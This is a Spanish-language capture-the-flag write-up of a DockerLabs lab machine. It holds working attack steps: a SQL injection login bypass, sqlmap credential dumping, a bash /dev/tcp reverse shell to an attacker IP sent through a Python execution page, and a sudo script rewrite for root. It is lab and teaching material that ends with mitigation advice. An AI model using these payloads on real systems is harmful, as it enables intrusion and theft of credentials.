---
title: Showtime
excerpt: WritheUp maquina de DockerLabs
publishDate: 'Mar 13 2025'
isFeatured: true
tags:
  - Web
  - Guide
  - CTF
  - Dockerlabs
seo:
  image:
    src: ''
    alt: Wavy lines
---



  ![alt text](<Captura de pantalla 2025-03-13 171154.png>)
  
  

## **1. Escaneo y Enumeración**:

  

Escaneo de red:

  

Comando:

  

```

nmap -sC -sV -sS -p- -open --min-rate 5000 172.17.0.2 -Pn -n -oN nmap.txt

```

  

Resultado:

  
Puerto 22 ssh

Puerto 80 http

![alt text](<Captura de pantalla 2025-03-13 171434.png>)
  
  
Enumeración:


Gobuster:

  

```

gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x txt,php,html -t 50

```



Resultado:

  ![alt text](<Captura de pantalla 2025-03-13 171729.png>)

Directorios --> /assets/

Directorios --> /icon/

Directorios --> /css/

Directorios --> /js/

Directorios --> /fonts/

Directorios --> /images/

Directorios --> /login_page/

Pagina principal:
 

 ![alt text](<Captura de pantalla 2025-03-13 171842.png>)

  
Herramientas: nmap Gobuster


## **2. Análisis de Vulnerabilidades**

  

Análisis manual:

Encontramos directorios comunes de una web, la que llama la atención es el directorio /login_page.


![alt text](<Captura de pantalla 2025-03-13 171935.png>)

Despues de probar  distintas posibilidades de credenciales pasamos a intentar inyecciones SQL, resultando ingresar y bypasear el login.

Comando Inyección:

```
admin' or '1'='1'-- -

```

![alt text](<Captura de pantalla 2025-03-13 172137.png>)

  En la pagina no encontramos nada, solo es un mensaje pero ahora sabemos que corre una base de datos lo mas probable de tipo SQL, intentaremos obtener mas información con la herramienta sqlmap:

Comandos

```
#Encontrar Bases de datos
sqlmap -u http://172.17.0.2/login_page/home.php --forms --dbs --batch 
```

![alt text](<Captura de pantalla 2025-03-13 173512.png>)

```
#Revisamos la B.D users 
sqlmap -u http://172.17.0.2/login_page/home.php --forms -D users --tables --batch

```

![alt text](<Captura de pantalla 2025-03-13 173910.png>)


```
#Vamos a obtener las tablas
sqlmap -u http://172.17.0.2/login_page/home.php --forms -D users -T usuarios --columns --batch
````


```
#Volcado de informacion de las columnas
sqlmap -u http://172.17.0.2/login_page/home.php --forms -D users -T usuarios -C id,password,username --dump --batch

```


![alt text](<Captura de pantalla 2025-03-13 175206.png>)

Con la información obtenida probamos volver a la pagina de login, solo con el usuario joe y password MiClaveEsInhackeable logramos resultados, entramos en una web en la que podemos ejecutar comandos de python.

![alt text](<Captura de pantalla 2025-03-13 175315.png>)

## **3. Explotación**

  

Explotar vulnerabilidades:


Hacemos la prueba con el comando "ls" logrando listar los archivos exitosamente.

![alt text](<Captura de pantalla 2025-03-13 175949.png>)

Ahora ejecutaremos una reverseshell para lograr acceso al servidor.

Comando:

```
import os
os.system("bash -c 'exec bash -i &>/dev/tcp/<IP-ATAK>/443 <&1'")

```


Logramos acceso como usuario www-data, despues de buscar mucho no encontré formas de escalar y  decidí ejecutar linpeas.sh encontrando un archivo oculto interesante llamado hidden_text.txt.

![alt text](<Captura de pantalla 2025-03-13 182625.png>)

![alt text](<Captura de pantalla 2025-03-13 205439.png>)

La lista hace suponer que pueden ser password, despues de intentar por ssh con hydra ingresar con los distintos usuarios no logre nada por lo que decidi transformar la lista a minusculas.

Comando:

```
cat hidden.txt | tr '[:upper:]' '[:lower:]' > password_test.txt

```

Logrando con el usuario joe y password chittychittybangbang ingresar por ssh.

![alt text](<Captura de pantalla 2025-03-13 184056.png>)

## **4. Post-Explotación**

  
Probamos que podemos ejecutar con este usuario.

![alt text](<Captura de pantalla 2025-03-13 210212.png>)

Revisamos GTFOBins:

![alt text](<Captura de pantalla 2025-03-13 184338.png>)

Logramos movernos al usuario luciano, repetimos el ejercicio de ver que podemos ejecutar, en este caso existe un archivo llamado script.sh.

![alt text](<Captura de pantalla 2025-03-13 210453.png>)

![alt text](<Captura de pantalla 2025-03-13 184826.png>)

Podemos modificar este archivo, lo ocuparemos para escalar privilegios, cambiamos el contenido del archivo.

Comando:

```
echo '#!/bin/bash

bash -p' >script.sh
```

Ahora ejecutamos el archivo logrando ser usuario root:

```
sudo /bin/bash /home/luciano/script.sh

```

![alt text](<Captura de pantalla 2025-03-13 211651.png>)


## **5. Informe y Comunicación**  


1. **Hallazgos Principales**
    
    - **Vulnerabilidades Identificadas**:
        
        - Inyección SQL en la página de login (`/login_page`).
            
        - Exposición de credenciales en la base de datos.
            
        - Ejecución remota de comandos a través de una funcionalidad de Python.
            
        - Archivo oculto con contraseñas en texto plano.
            
        - Permisos inseguros en scripts que permiten escalada de privilegios.
            
    - **Impacto**: Explicar el riesgo asociado a cada vulnerabilidad (ej: acceso no autorizado, exposición de datos sensibles, toma de control del sistema).
        
2. **Proceso de Explotación**
    
    - **Fase de Reconocimiento**: Detallar el escaneo inicial con Nmap y la enumeración de directorios con Gobuster.
        
    - **Fase de Análisis**: Explicar cómo se identificó y explotó la inyección SQL, así como la extracción de credenciales de la base de datos.
        
    - **Fase de Explotación**: Describir la obtención de la reverse shell y el acceso al sistema como `www-data`.
        
    - **Post-Explotación**: Documentar la escalada de privilegios hasta obtener acceso como `root`.
        
3. **Evidencias**
    
    - Incluir capturas de pantalla clave que respalden los hallazgos (ej: resultados de Nmap, inyección SQL exitosa, volcado de la base de datos, acceso como `root`).
        
    - Adjuntar logs de herramientas utilizadas (Nmap, SQLMap, etc.) en un anexo.
        
4. **Recomendaciones**
    
    - **Mitigación de Vulnerabilidades**:
        
        - Implementar validación de entradas para prevenir inyecciones SQL.
            
        - Almacenar contraseñas de forma segura (hashing con salt).
            
        - Restringir permisos de ejecución en scripts y archivos críticos.
            
        - Eliminar archivos ocultos con información sensible.
            
    - **Mejoras de Seguridad**:
        
        - Realizar auditorías de seguridad periódicas.
            
        - Implementar un sistema de detección de intrusiones (IDS).
            
        - Capacitar al personal en prácticas de desarrollo seguro (DevSecOps).

  

---

  
## **6. Resumen**  

  En este ejercicio, se realizó la explotación de una máquina virtual que presentaba múltiples vulnerabilidades, comenzando con un escaneo de puertos y enumeración de directorios. Se identificó una vulnerabilidad de inyección SQL en la página de login, lo que permitió el acceso no autorizado a la base de datos y la obtención de credenciales válidas. Posteriormente, se explotó una funcionalidad de ejecución de comandos en Python para obtener una reverse shell y acceder al sistema como usuario `www-data`. Tras una exhaustiva búsqueda, se encontró un archivo oculto con posibles contraseñas, lo que permitió acceder al sistema como usuario `joe` y, finalmente, escalar privilegios hasta obtener acceso como `root`. Este ejercicio destaca la importancia de la seguridad en el desarrollo de aplicaciones web y la necesidad de realizar pruebas de penetración regulares para identificar y corregir vulnerabilidades antes de que sean explotadas por atacantes malintencionados.

